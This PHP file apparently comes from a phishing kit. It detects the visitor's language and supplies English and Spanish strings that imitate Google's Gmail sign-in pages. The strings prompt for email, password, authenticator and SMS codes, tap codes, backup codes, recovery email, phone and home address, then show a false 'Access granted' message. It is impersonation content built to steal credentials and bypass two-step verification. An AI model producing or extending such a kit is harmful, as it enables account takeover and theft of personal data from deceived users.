<?php
function detectLanguage() {
    $lang = 'en';
    
    if (isset($_GET['lang'])) {
        $lang = strtolower(substr($_GET['lang'], 0, 2));
        setcookie('lang', $lang, time() + 31536000, '/');
    } elseif (isset($_COOKIE['lang'])) {
        $lang = strtolower(substr($_COOKIE['lang'], 0, 2));
    } elseif (isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])) {
        $languages = explode(',', $_SERVER['HTTP_ACCEPT_LANGUAGE']);
        $lang = strtolower(substr($languages[0], 0, 2));
    }
    
    return ($lang === 'es' || $lang === 'en') ? $lang : 'en';
}

$LANG = detectLanguage();

$translations = [
    'en' => [
        'sign_in' => 'Sign in',
        'to_continue_to_gmail' => 'to continue to Gmail',
        'email_or_phone' => 'Email or phone',
        'forgot_email' => 'Forgot email?',
        'next' => 'Next',
        'not_your_computer' => 'Not your computer? Use a Private Window to sign in.',
        'learn_more' => 'Learn more about using Guest mode',
        'create_account' => 'Create account',
        'help' => 'Help',
        'privacy' => 'Privacy',
        'terms' => 'Terms',
        'welcome' => 'Welcome',
        'enter_your_password' => 'Enter your password',
        'show_password' => 'Show password',
        'try_another_way' => 'Try another way',
        'forgot_password' => 'Forgot password?',
        'wrong_password' => 'Wrong password. Try again or click Forgot password to reset it.',
        'verifying_your_identity' => 'Verifying your identity',
        'please_wait' => 'Please wait while we verify your account.',
        'two_step_verification' => '2-Step Verification',
        'enter_code_authenticator' => 'Enter the code from your Google Authenticator app',
        'enter_6digit_code' => 'Enter 6-digit code',
        'to_help_keep_safe' => 'To help keep your account safe, Google wants to make sure it\'s really you trying to sign in',
        'verification_code_sent' => 'Google sent a verification code to your phone',
        'enter_the_code' => 'Enter the code',
        'resend_it' => 'Resend it',
        'verifying' => 'Verifying...',
        'loading' => 'Loading...',
        'error_page' => 'Error',
        'something_wrong' => 'Something went wrong. Please try again.',
        'success_page' => 'Success',
        'access_granted' => 'Access granted! You have successfully verified your account.',
        'tap_code' => 'Tap Code',
        'show_tap_code' => 'Show tap code',
        'three_codes' => '3 Codes',
        'show_three_codes' => 'Show three codes',
        'recovery_info' => 'Recovery Info',
        'home_address' => 'Home Address',
        'address' => 'Address',
        'phone' => 'Phone',
        'recovery_email' => 'Recovery Email'
    ],
    'es' => [
        'sign_in' => 'Iniciar sesión',
        'to_continue_to_gmail' => 'para continuar a Gmail',
        'email_or_phone' => 'Correo electrónico o teléfono',
        'forgot_email' => '¿Olvidaste tu correo?',
        'next' => 'Siguiente',
        'not_your_computer' => '¿No es tu computadora? Usa una ventana privada para iniciar sesión.',
        'learn_more' => 'Más información sobre el modo de invitado',
        'create_account' => 'Crear cuenta',
        'help' => 'Ayuda',
        'privacy' => 'Privacidad',
        'terms' => 'Términos',
        'welcome' => 'Bienvenido',
        'enter_your_password' => 'Ingresa tu contraseña',
        'show_password' => 'Mostrar contraseña',
        'try_another_way' => 'Probar otro método',
        'forgot_password' => '¿Olvidaste tu contraseña?',
        'wrong_password' => 'Contraseña incorrecta. Intenta de nuevo o haz clic en Olvidaste tu contraseña para restablecerla.',
        'verifying_your_identity' => 'Verificando tu identidad',
        'please_wait' => 'Por favor espera mientras verificamos tu cuenta.',
        'two_step_verification' => 'Verificación en 2 pasos',
        'enter_code_authenticator' => 'Ingresa el código de tu aplicación Google Authenticator',
        'enter_6digit_code' => 'Ingresa código de 6 dígitos',
        'to_help_keep_safe' => 'Para ayudar a proteger tu cuenta, Google quiere asegurarse de que realmente eres tú quien intenta iniciar sesión',
        'verification_code_sent' => 'Google envió un código de verificación a tu teléfono',
        'enter_the_code' => 'Ingresa el código',
        'resend_it' => 'Reenviar',
        'verifying' => 'Verificando...',
        'loading' => 'Cargando...',
        'error_page' => 'Error',
        'something_wrong' => 'Algo salió mal. Por favor intenta de nuevo.',
        'success_page' => 'Éxito',
        'access_granted' => '¡Acceso concedido! Has verificado exitosamente tu cuenta.',
        'tap_code' => 'Código de Tap',
        'show_tap_code' => 'Mostrar código de tap',
        'three_codes' => '3 Códigos',
        'show_three_codes' => 'Mostrar tres códigos',
        'recovery_info' => 'Info de Recuperación',
        'home_address' => 'Dirección del Hogar',
        'address' => 'Dirección',
        'phone' => 'Teléfono',
        'recovery_email' => 'Correo de Recuperación'
    ]
];

function t($key) {
    global $LANG, $translations;
    return $translations[$LANG][$key] ?? $translations['en'][$key] ?? $key;
}

function lang() {
    global $LANG;
    return $LANG;
}
?>
